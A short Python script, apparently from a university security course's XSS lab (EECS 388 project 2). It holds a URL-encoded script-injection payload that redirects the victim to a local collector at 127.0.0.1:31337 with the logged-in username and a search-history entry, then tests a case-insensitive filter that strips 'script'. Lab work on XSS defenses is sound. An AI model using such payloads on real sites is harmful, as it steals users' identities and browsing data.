import re

input = "https://eecs388.org/project2/search?xssdefense=0&q=%3Cscript%3E%24(document).ready(function()%7Bwindow.location.href%3D%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%3Fuser%3D%22%2B%24(%27%23logged-in-user%27).text()%2B%22%26last_search%3D%22%2B%24(%27%23history-list%27).children(%27a%3Anth-child(2)%27).text()%3B%7D)%3B%3C%2Fscript%3E"

filtered = re.sub(r"(?i)script", "", input)

print filtered